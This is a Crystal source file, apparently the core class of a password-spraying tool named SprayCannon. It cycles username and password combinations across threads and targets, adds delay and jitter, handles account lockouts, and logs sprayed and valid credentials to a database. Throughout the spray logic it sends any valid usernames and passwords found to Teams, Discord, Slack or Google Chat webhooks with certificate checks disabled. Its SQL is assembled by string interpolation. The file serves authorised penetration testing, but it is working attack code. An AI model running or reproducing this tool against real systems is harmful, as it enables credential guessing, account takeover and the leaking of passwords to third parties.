require "colorize"
require "http/client"

class User
    @username = ""
    @password = "" 
    @lockedout = false
    @attempts = [] of String
end


class Sprayer
    property usernames : Array(String), passwords : Array(String), delay : Int32 , jitter : Int32  , target : String, uap : Bool, upf : Bool, webhook_url : String 
    property valid : Array(String)
    # property useragents : Array(String) = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/90.0"]
    property useragents : Array(String) = ["SprayCannon user agent. Password Spraying tool. Check your logs"]
    # property user_agent : String = "SprayCannon user agent. Password Spraying tool. Check your logs"
    property targets : Array(String) = [""]
    # property rate : Int32

    def initialize(username : String, password : String)
        @usernames = [] of String
        @passwords = [] of String
        @usernames << username
        @passwords << password
        @delay = 30
        @jitter = 1
        @target = "localhost"
        @uap = false
        @upf = false
        @valid = [] of String
        @webhook_url = ""
        @targets_index = 0
        # @channel : Channel(Array(String|Bool|Nil) | Nil)
        # @rate = 1 
    end

    def initialize(username : String) 
        @usernames = [] of String 
        @passwords = [] of String
        @usernames << username 
        @passwords << ""
        @delay = 30
        @jitter = 1
        @target = "localhost"
        @uap = false
        @upf = false
        @valid = [] of String
        @webhook_url = ""
        @targets_index = 0
    end

    def initialize(usernamear : Array(String))
        @usernames = [] of String 
        @passwords = [] of String
        @usernames = usernamear
        @passwords << ""
        @delay = 30
        @target = "localhost"
        @jitter = 1
        @valid = [] of String
        @uap = false
        @upf = false
        @webhook_url = ""
        @targets_index = 0
    end

    def initialize(usernamear : Array(String), passwordar : Array(String))
        @usernames = [] of String 
        @passwords = [] of String
        @usernames = usernamear 
        @passwords = passwordar
        @delay = 30
        @jitter = 1
        @target = "localhost"
        @valid = [] of String
        @uap = false
        @upf = false
        @webhook_url = ""
        @targets_index = 0
    end


    # super method as placeholder. this is for the single logon attempt code per "module"
    # below is just for testing purposes  
    # should return an array of [username, password, valid, lockout, mfa]
    def spray(username : String, password : String) : Array(String | Bool)
        puts "\rDEFAULT METHOD!!! YOUR SPRAY IS NOT ACTUALLY WORKING!!!!".colorize(:red)

        # the below is just a simulation for testing purposes

        islockedout = false
        isvalid = false
        mfa = false
        #simulating an attempt
        x = rand() 
        if (x = x.round() == 1  )
            islockedout = true
        end        
        x = rand() 
        if x = x.round() == 1 
            isvalid = true 
        end
        x = rand() 
        if x = x.round() == 1 
            mfa = true 
        end
        # return an array of [username, password, valid, lockedout, mfa] that way the parent can maintain a list without worrying about the child classes
        return [username, password, isvalid, islockedout, mfa]

    end

    # starts the sprayer with a jitter of 1 and a delay of 30 
    def start(thread_count = 1, db = nil)
        @lockout = false
        cont = false
        already_sprayed = [] of String
        valid_accounts = [] of String
        queued_count = 0 # int to keep track of ammount still queued 
        
        # create list of already sprayed user:passwords 
        if db
            already_sprayed = get_dbsprayed(db).as(Array(String))
            valid_accounts = get_dbvalid(db).as(Array(String))
        end

        if thread_count > 1
            # create channels for spraying 
            queue_channel = Channel( Array(String) | Nil ).new
            results_channel = Channel( Array(String|Bool) | Nil ).new

            # spawn worker threads 
            STDERR.puts "Spawning threads"

            thread_count.times do |i|
                spawn do
                    loop do 
                        # puts @target

                        f = queue_channel.receive()
                        break if f.nil? # close the fiber if nil is received # signalling the completion of the spray and can close the fibers 
                        uname = f[0].as(String)
                        pass = f[1].as(String)
                        if already_sprayed.includes? "#{uname}:#{pass}" || valid_accounts.includes? uname
                            STDERR.puts "Skipping #{uname}:#{pass} because its already sprayed!!".colorize(:yellow).to_s
                            queued_count -= 1 # remove the count for already being sprayed
                            next
                        end
                        # lock the fiber if lockout is detected(this will still spray on some fibers until they rotate into this. once released all fibers will start again)
                        if !cont && @lockout
                            while !cont # while locked pause until continue
                                sleep 0.1
                            end
                        end

                        begin # handle any errors with a spray 
                            # do the spray 
                            res = spray(uname, pass)
                        rescue e 
                            puts "Error: ".colorize(:yellow).to_s + "#{uname}:#{pass}".colorize(:red).to_s + " crached durring a spray. user will not be logged to the db".colorize(:yellow).to_s
                            puts e.message 
                            queued_count -= 1 # make sure the count is decremented so it wont hang 
                            next
                        end


                        #update lockout
                        @lockout = res.as(Array(String|Bool))[3].as(Bool)
                        
                        
                        # do db operations if db is used 
                        if db
                            insert_db_sprayed(db, uname, pass) unless res.as(Array(String|Bool))[3].as(Bool) # add to sprayed unless it was locked
                            insert_db_valid(db, uname, pass) if res.as(Array(String|Bool))[2].as(Bool) # add to valid db if valid
                        end

                        # if valid send and user specified a webhook send one 
                        if res.as(Array(String|Bool))[2].as(Bool) && @webhook_url != ""
                            web_hook(uname, pass, res.as(Array(String|Bool))[4].as(Bool)) # webhook(user,pass,mfabool)
                        end

                        # rotate to the next target if more than one exists 
                        next_target()

                        # finally send the result to the results channel so it can be printed to the user
                        results_channel.send res

                        # wait the jitter time # god i hope sleep is working in threads...... 
                        # t_jitter()
                    end
                end
            end

            # spawn printer thread
            spawn do 
                loop do 
                    res = results_channel.receive()
                    break if res.nil?
                    queued_count -= 1
                    puts "\r#{res[0].as(String)}, #{res[1].as(String)},#{"Valid".colorize(:green).to_s if res[2].as(Bool)},#{"locked".colorize(:red) if res[3].as(Bool)}, #{"mfa".colorize(:yellow) if res[4].as(Bool)}"
                end
            end

            # create a thread for handling the locked issue
            # spawn do 
            #     loop do
            #         # puts "Lockout: #{@lockout} cont: #{cont}"
            #         break if cont 
            #         # if @lockout
            #         STDERR.puts "Lockout detected!!!".colorize(:red)
            #         STDERR.puts "Continue? (y/N)".colorize(:yellow)
            #         x = gets
            #         exit 1 if x.nil? || x == "\r"
            #         if (x.downcase =~ /ye?s?/)
            #             cont = true
            #         else 
            #             STDERR.puts "Quiting spraying attack!!!".colorize(:yellow)
            #             exit 1
            #         end
            #     end
            # end




            # start queuing things to be sprayed
            # if user:password format
            if @upf # user password format ie:    uername:password for 1:1 username password combos 
                STDERR.puts "Spraying as user:password format"
                upflist = generate_upf_list()
                # puts "Sending to queue_channel"
                upflist.each do |item|

                    if @lockout && !cont 
                        STDERR.puts "Lockout detected!!!".colorize(:red)
                        STDERR.puts "Continue? (y/N)".colorize(:yellow)
                        # STDIN.read_timeout = 600
                        x = gets
                        exit 1 if x.nil? || x == "\r"
                        if (x.downcase =~ /ye?s?/)
                            cont = true
                        else 
                            STDERR.puts "Quiting spraying attack!!!".colorize(:yellow)
                            exit 1
                        end
                    end

                    if already_sprayed.includes? "#{item[0]}:#{item[1]}" || valid_accounts.includes? item[0]
                        STDERR.puts "Skipping #{item[0]}:#{item[1]} because its already sprayed!!".colorize(:yellow).to_s
                        # queued_count -= 1 # remove the count for already being sprayed
                        next
                    end
                
                    # print "\rItems in queue to be sprayed: #{queued_count} " 
                    queue_channel.send item 
                    queued_count += 1 
                    jitter() unless item[0] == @usernames.last || valid_accounts.includes? item[0] || already_sprayed.includes? "#{item[0]}:#{item[1]}"
                end
            elsif @uap # user as password
                # puts "Generating user:user list"
                uap_list = generate_uap_list()
                STDERR.puts "Spraying as user:user format"
                # puts "Sending to queue_channel"
                uap_list.each do |item|
                    if @lockout && !cont 
                        STDERR.puts "Lockout detected!!!".colorize(:red)
                        STDERR.puts "Continue? (y/N)".colorize(:yellow)
                        # STDIN.read_timeout = 600
                        x = gets
                        exit 1 if x.nil? || x == "\r"
                        if (x.downcase =~ /ye?s?/)
                            cont = true
                        else 
                            STDERR.puts "Quiting spraying attack!!!".colorize(:yellow)
                            exit 1
                        end
                    end

                    if already_sprayed.includes? "#{item[0]}:#{item[1]}" || valid_accounts.includes? item[0]
                        STDERR.puts "Skipping #{item[0]}:#{item[1]} because its already sprayed!!".colorize(:yellow).to_s
                        # queued_count -= 1 # remove the count for already being sprayed
                        next
                    end
                    # print "\rItems in queue to be sprayed: #{queued_count} " 
                    queue_channel.send item 
                    queued_count += 1 
                    jitter() unless item[0] == @usernames.last || valid_accounts.includes? item[0] || already_sprayed.includes? "#{item[0]}:#{item[1]}"
                end
            else 
                @passwords.each do |pass|
                    STDERR.puts "Spraying as user:password format"
                    combo_list = generate_combo_list(pass)
                    # STDERR.puts "Sending to queue_channel"
                    combo_list.each do |item|
                        if @lockout && !cont
                            STDERR.puts "Lockout detected!!!".colorize(:red)
                            STDERR.puts "Continue? (y/N)".colorize(:yellow)
                            # STDIN.read_timeout = 600
                            x = gets
                            exit 1 if x.nil? || x == "\r"
                            if (x.downcase =~ /ye?s?/)
                                cont = true
                            else 
                                STDERR.puts "\nQuiting spraying attack!!!".colorize(:yellow)
                                exit 1
                            end
                        end

                        if already_sprayed.includes? "#{item[0]}:#{item[1]}" || valid_accounts.includes? item[0]
                            STDERR.puts "\rSkipping #{item[0]}:#{item[1]} because its already sprayed!!".colorize(:yellow).to_s
                            # queued_count -= 1 # remove the count for already being sprayed
                            next
                        end
                        # print "\rItems in queue to be sprayed: #{queued_count} " 
                        queue_channel.send item 
                        queued_count += 1 
                        jitter() unless item[0] == @usernames.last || valid_accounts.includes? item[0] || already_sprayed.includes? "#{item[0]}:#{item[1]}"
                    end
                    delay() unless pass == passwords.last
                end
            end 

            # sleep until queued count finishes 
            while queued_count > 0 
                print "\rItems in queue to be sprayed: #{queued_count}  " 
                sleep 1
            end
            return 

            # end
        end

        if thread_count < 2
        # # if user as password just spray once
                        # start queuing things to be sprayed
            # if user:password format
            if @upf # user password format ie:    uername:password for 1:1 username password combos 
                STDERR.puts "Spraying as user:password format"
                upflist = generate_upf_list()
                # puts "Sending to queue_channel"
                upflist.each do |item|
                    # puts @target
                    
                    if already_sprayed.includes? "#{item[0]}:#{item[1]}" || valid_accounts.includes? item[0]
                        STDERR.puts "Skipping #{item[0]}:#{item[1]} because its already sprayed!!".colorize(:yellow).to_s
                        # queued_count -= 1 # remove the count for already being sprayed
                        next
                    end

                    attempt = spray(item[0],item[1])
                    next_target()
                    next if attempt.nil?
                    @lockout = attempt[3].as(Bool|Nil)

                    if @lockout && cont == false
                        STDERR.puts "Lockout detected!!!".colorize(:red)
                        STDERR.puts "Continue? (y/N)".colorize(:yellow)
                        # STDIN.read_timeout = 600
                        x = gets
                        return if x.nil? || x == "\r"
                        if (x.downcase =~ /ye?s?/)
                            cont = true
                        else 
                            STDERR.puts "Quiting spraying attack!!!".colorize(:yellow)
                            return
                        end
                    end

                    if db
                        insert_db_sprayed(db, item[0],item[1]) unless attempt[3] # add to sprayed unless it was locked
                        insert_db_valid(db, item[0],item[1]) if attempt[2] # ie valid
                    end
                    


                    puts "#{attempt[0].as(String)}, #{attempt[1].as(String)},#{" Valid".colorize(:green).to_s if attempt[2]},#{" locked".colorize(:red).to_s if attempt[3]}, #{" mfa".colorize(:yellow).to_s if attempt[4]}"
                                        
                    # if valid and webhook not "" send webhook 
                    if attempt[2] && @webhook_url != ""
                        web_hook(attempt[0].as(String), attempt[1].as(String), attempt[4])
                    end


                    jitter() unless item[0] == @usernames.last || valid_accounts.includes? item[0] || already_sprayed.includes? "#{item[0]}:#{item[1]}"
                end
                return 
            elsif @uap # user as password
                usernames.each do |uname|
                    if already_sprayed.includes? "#{uname}:#{uname}" || valid_accounts.includes? uname
                        STDERR.puts "Skipping #{uname}:#{uname} because its already sprayed!!".colorize(:yellow).to_s
                        next
                    end
                    attempt = spray(uname, uname)
                    next_target()
                    next if attempt.nil?
                    @lockout = attempt[3].as(Bool|Nil)
                    if @lockout && cont == false
                        STDERR.puts "Lockout detected!!!".colorize(:red)
                        STDERR.puts "Continue? (y/N)".colorize(:yellow)
                        # STDIN.read_timeout = 600
                        x = gets
                        return if x.nil? || x == "\r"
                        if (x.downcase =~ /ye?s?/)
                            cont = true
                        else 
                            STDERR.puts "Quiting spraying attack!!!".colorize(:yellow)
                            return
                        end
                    end
                

                    if db
                        insert_db_sprayed(db, uname, uname) unless attempt[3] # add to sprayed unless it was locked
                        insert_db_valid(db, uname, uname) if attempt[2] # ie valid
                    end


                    puts "#{attempt[0].as(String)}, #{attempt[1].as(String)},#{" Valid".colorize(:green).to_s if attempt[2]},#{" locked".colorize(:red).to_s if attempt[3]}, #{" mfa".colorize(:yellow).to_s if attempt[4]}"
                    
                    
                    # if valid and webhook not "" send webhook 
                    if attempt[2] && @webhook_url != ""
                        web_hook(attempt[0].as(String), attempt[1].as(String), attempt[4])
                    end
                    
                    
                    jitter() unless uname == usernames.last
                end
                return 
            end
            # all other user/pass combos
            passwords.each do |pass|
                puts "Spraying password: ".colorize(:yellow).to_s + pass
                usernames.each do |uname|
                    if already_sprayed.includes? "#{uname}:#{pass}" || valid_accounts.includes? uname
                        STDERR.puts "Skipping #{uname}:#{pass} because its already sprayed!!".colorize(:yellow).to_s
                        next 
                    end
                    attempt = spray(uname, pass)
                    next_target()
                    next if attempt.nil?
                    @lockout = attempt[3].as(Bool|Nil)

                    if @lockout && cont == false
                        STDERR.puts "Lockout detected!!!".colorize(:red)
                        STDERR.puts "Continue? (y/N)".colorize(:yellow)
                        # STDIN.read_timeout = 600 # 
                        x = gets
                        return if x.nil?
                        if (x.downcase =~ /[yes]+/)
                            cont = true
                        else 
                            STDERR.puts "Quiting spraying attack!!!".colorize(:yellow)
                            return
                        end
                    end



                    if db
                        insert_db_sprayed(db, uname, pass)
                        insert_db_valid(db, uname, pass) if attempt[2]
                    end


                    # puts "#{uname}, #{pass}, #{(attempt[2]) ? "valid" : "invalid".colorize(:red).to_s }, #{ (attempt[3]) ? "locked".colorize(:red).to_s : "notlocked"  }"
                    puts "#{attempt[0].as(String)}, #{attempt[1].as(String)},#{" valid".colorize(:green).to_s if attempt[2]},#{" locked".colorize(:red).to_s if attempt[3]}, #{" mfa".colorize(:yellow).to_s if attempt[4]}"
                    
                    # if valid and webhook not "" send webhook 
                    if attempt[2] && @webhook_url != ""
                        web_hook(attempt[0].as(String), attempt[1].as(String), attempt[4])
                    end
                    jitter() unless uname == usernames.last || valid_accounts.includes? uname || already_sprayed.includes? "#{uname}:#{pass}"
                end

                puts "Sleeping for #{@delay} Seconds!!".colorize(:yellow).to_s
                # sleep @delay unless pass == passwords.last
                delay() unless pass == passwords.last
            end
        end
    end

    protected def next_target()
        return if @targets.size < 2 
        @targets_index = ( @targets_index + 1 ) % @targets.size
        @target = @targets[@targets_index] if @targets.size > 1
    end

    protected def insert_db_sprayed(db,username,password)
        begin 
            db.exec "insert into username(username) values (\"#{username}\")"
        rescue e 
            # STDERR.puts e.message
        end

        begin 
            db.exec "insert into password(password) values (\"#{password}\")"
        rescue e 
            # STDERR.puts e.message
        end

        # add sprayed combo to sprayed list
        begin  
            db.exec "
                    insert into passwords_sprayed
                    select username.usernameid, password.passwordid , DATETIME('now','localtime'), '#{self.class}'
                    from username, password 
                    where 
                    username.username = \"#{username}\"
                    and 
                    password.password = \"#{password}\";" # dont add to attempted if locked
        rescue e 
            # STDERR.puts e.message
        end
    end

    protected def insert_db_valid(db,username,password)
        begin 
            db.exec "insert into username(username) values (\"#{username}\")"
        rescue e 
            # STDERR.puts e.message
        end

        begin 
            db.exec "insert into password(password) values (\"#{password}\")"
        rescue e 
            # STDERR.puts e.message
        end

        begin 
            # if valid add to that table too 
                db.exec "insert into valid_passwords
                    select username.usernameid, password.passwordid, DATETIME('now','localtime'), '#{self.class}'
                    from username, password 
                    where 
                    username.username = \"#{username}\"
                    and 
                    password.password = \"#{password}\";"
            rescue e 
                STDERR.puts "Valid Error: "
                STDERR.puts e.message
            end
    end

    protected def get_dbsprayed(db) # : Array(String)
        already_sprayed = [] of String
        begin 
            # populate previously sprayed accounts 
            db.query "select username.username, password.password
            from username, password, passwords_sprayed
            where 
            username.usernameid = passwords_sprayed.usernameid
            and 
            password.passwordid = passwords_sprayed.passwordid;" do |rs|
                rs.each do
                    already_sprayed << "#{rs.read(String)}:#{rs.read(String)}"
                end
            end

        rescue e 
            STDERR.puts "Error: #{e.message}"
            STDERR.puts "Could not get list of previous spray attempts!! Possible passwords already sprayed may be sprayed again!!!"
            STDERR.print "Would you like to exit? Y/n"
            x = gets
            return if x.nil?
            if( x.downcase =~ /ye?s?/ || x == "\r")
                STDOUT.puts "Exiting!"
                exit 0
            else 
                STDERR.puts "Continuing...."
            end
        end
        return already_sprayed
    end

    protected def get_dbvalid(db)#  : Array(String)
        valid_accounts = [] of String
        begin 
            # populate valid accounts 
            db.query "select username.username, password.password 
            from username, password, valid_passwords
            where 
            username.usernameid = valid_passwords.usernameid
            and 
            password.passwordid = valid_passwords.passwordid;" do |rs|
                rs.each do
                    valid_accounts << "#{rs.read(String)}"
                end
            end

        rescue e 
            STDERR.puts "Error: #{e.message}"
            STDERR.puts "Could not get list of valid spray attempts!! Possible passwords already sprayed may be sprayed again!!!"
            STDERR.print "Would you like to exit? y/N"
            x = gets
            return if x.nil?
            if( x.downcase =~ /ye?s?/)
                STDOUT.puts "Exiting!"
                exit 0
            else 
                STDERR.puts "Continuing...."
            end
        end
        return valid_accounts
    end

    protected def generate_uap_list() 
        ar = [] of Array(String)
        @usernames.each do |uname|
            ar << [uname, uname]
        end 
        return ar 
    end

    protected def generate_upf_list() : Array(Array(String))
        ar = [] of Array(String)
        @usernames.each_index do |i|
            # puts "#{@usernames[i]}:#{@passwords[i]}"
            ar << [@usernames[i] , @passwords[i]]
        end 
        return ar 
    end

    protected def generate_combo_list(password)
        ar = [] of Array(String)
        @usernames.each do |uname|
            ar << [uname, password]
        end 
        return ar
    end


    protected def jitter()
        if @jitter < 1000
            STDERR.print "Jitter: #{@jitter / 1000} \r"
            sleep ( @jitter / 1000 )
            STDERR.print "\r                        \r"
            return 
        end
        @jitter.times do |t|
            STDERR.print "\rJitter: #{@jitter - t} "
            sleep 0.001
        end 
        print "\r                        \r"
    end

    protected def t_jitter() # threaded jitter
        if @jitter < 1000
            # print "Jitter: #{@jitter / 1000}"
            sleep ( @jitter / 1000 )
            #print "\r                        \r"
            return 
        end
        @jitter.times do |t|
            #print "\rJitter: #{@jitter - t} "
            sleep 0.001
        end 
        #print "\r                        \r"
    end

    protected def delay()
        x = false 
        @delay.times do |t|
            break if x 
            STDERR.print "\rSleeping: #{@delay - t}  (press enter to skip delay)  "
            begin 
                STDIN.read_timeout = 1 # 
                STDIN.gets # get a key responce but time out after 1 second.... if get key press break loop
                x = true 
                STDIN.read_timeout = nil
            rescue 
                next
                STDIN.read_timeout = nil
            ensure 
                STDIN.read_timeout = nil
            end
            puts "continuing "
        end
        STDERR.print "\n"
    end


    # wrapper for each individual webhook 
    protected def web_hook( username, password, mfa )
        STDERR.puts "Sending webhook"

        if @webhook_url.includes? "webhook.office.com"
            teams_web_hook(username, password, mfa) 
        elsif @webhook_url.includes? "discord.com"
            discord_web_hook(username, password, mfa)
        elsif @webhook_url.includes? "hooks.slack.com"
            slack_web_hook(username, password, mfa)
        elsif @webhook_url.includes? "chat.googleapis.com"
            googlechat_web_hook(username, password , mfa )
        end
    end



    protected def discord_web_hook(username, password, mfa )
        # STDERR.puts "Sending webhook to Discord! "
        mfa_str = "No"
        mfa_str = "Yes" if mfa
        card = %(
            {
                "content": null,
                "embeds": [
                    {
                    "title": "Valid Password Found!",
                    "description": "Target: #{@target}",
                    "color": 65328,
                    "fields": [
                        {
                        "name": "__Username__",
                        "value": "`#{username}`",
                        "inline": true
                        },
                        {
                        "name": "__Password__",
                        "value": "`#{password}`",
                        "inline": true
                        },
                        {
                        "name": "__MFA Status__",
                        "value": "`#{mfa_str}`",
                        "inline": true
                        }
                    ]
                    }
                ],
                "username": "SprayCannon"
                }
        )
        # added this so if going through burp you will be fine 
        context = OpenSSL::SSL::Context::Client.new
        context.verify_mode = OpenSSL::SSL::VerifyMode::NONE
        begin 
            answer = HTTP::Client.post( URI.parse( @webhook_url ), headers: HTTP::Headers{"Content-Type" => "application/json"} , body: card, tls: context )
            if answer.status_code != 204
                STDERR.puts "Web Hook BROKE!!!!!!!!!! | CHECK SPDB".colorize(:red)
            end
        rescue 
            STDERR.puts "Webhook failed to execute... :( | CHECK SPDB!!!"
        end
    end


    # teams webhook. more can be implemented if necessary 
    protected def teams_web_hook(username, password, mfa)
        mfa_str = "No"
        mfa_str = "Yes" if mfa
        card = "
        {
            \"@type\": \"MessageCard\",
            \"@context\": \"http://schema.org/extensions\",
            \"themeColor\": \"0076D7\",
            \"summary\": \"Valid Password Found!!!!\",
            \"sections\": [{
                \"activityTitle\": \"Valid Password Found!!!!!\",
                \"facts\": [{
                    \"name\": \"Target: \",
                    \"value\": \"#{@target}\"
                }, {
                    \"name\": \"User: \",
                    \"value\": \"#{username}\"
                }, {
                    \"name\": \"Password:\",
                    \"value\": \"#{password}\"
                },{
                    \"name\": \"MFA:\",
                    \"value\": \"#{mfa_str}\"
                }],
                \"markdown\": true
            }]
        }
        "

        # added this so if going through burp you will be fine 
        context = OpenSSL::SSL::Context::Client.new
        context.verify_mode = OpenSSL::SSL::VerifyMode::NONE
        begin 
            answer = HTTP::Client.post( URI.parse( @webhook_url ) , body: card, tls: context )
            if answer.body.to_i  != 1 
                STDERR.puts "Web Hook BROKE!!!!!!!!!! | CHECK SPDB".colorize(:red)
            end
        rescue 
            STDERR.puts "Webhook failed to execute... :( | CHECK SPDB!!!"
        end
    end


    protected def slack_web_hook(username, password , mfa)
        mfa_str = "No"
        mfa_str = "Yes" if mfa
        card = %(
            {
                "blocks": [
                    {
                        "type": "header",
                        "text": {
                            "type": "plain_text",
                            "text": "Valid Password Found!",
                            "emoji": true
                        }
                    },
                    {
                        "type": "context",
                        "elements": [
                            {
                                "type": "mrkdwn",
                                "text": "*Target:* #{@target}"
                            }
                        ]
                    },
                    {
                        "type": "section",
                        "fields": [
                            {
                                "type": "mrkdwn",
                                "text": "*UserName:* #{username}"
                            },
                            {
                                "type": "mrkdwn",
                                "text": "\n*Password:* #{password}"
                            },
                            {
                                "type": "mrkdwn",
                                "text": "*MFA Status:* #{mfa_str}"
                            }
                        ]
                    },
                    {
                        "type": "divider"
                    }
                ]
            }
        )

        # added this so if going through burp you will be fine 
        context = OpenSSL::SSL::Context::Client.new
        context.verify_mode = OpenSSL::SSL::VerifyMode::NONE
        begin 
            answer = HTTP::Client.post( URI.parse( @webhook_url ) , body: card, tls: context )
            if answer.status_code != 200
                STDERR.puts "Web Hook BROKE!!!!!!!!!! | CHECK SPDB".colorize(:red)
            end
        rescue 
            STDERR.puts "Webhook failed to execute... :( | CHECK SPDB!!!"
        end
    end


    protected def googlechat_web_hook(username, password , mfa)
        mfa_str = "No"
        mfa_str = "Yes" if mfa
        card = %(
            {
                "cards": [
                    {
                        "header":{
                            "title":"Valid Password Found!",
                            "subtitle": "#{@target}"
                        },
                        "sections": [
                        {
                            "widgets": [
                            {
                                "textParagraph": {
                                "text": "<b><u>Username:</u></b> #{username}<br><b><u>Password:</u></b> #{password}<br><b><u>MFA Status:</u></b> #{mfa_str}"
                                }
                            }
                            ]
                        }
                        ]
                    }
                ]
            }
        )

        # added this so if going through burp you will be fine 
        context = OpenSSL::SSL::Context::Client.new
        context.verify_mode = OpenSSL::SSL::VerifyMode::NONE
        begin 
            answer = HTTP::Client.post( URI.parse( @webhook_url ) , body: card, tls: context )
            if answer.status_code != 200
                STDERR.puts "Web Hook BROKE!!!!!!!!!! | CHECK SPDB".colorize(:red)
            end
        rescue 
            STDERR.puts "Webhook failed to execute... :( | CHECK SPDB!!!"
        end
    end
end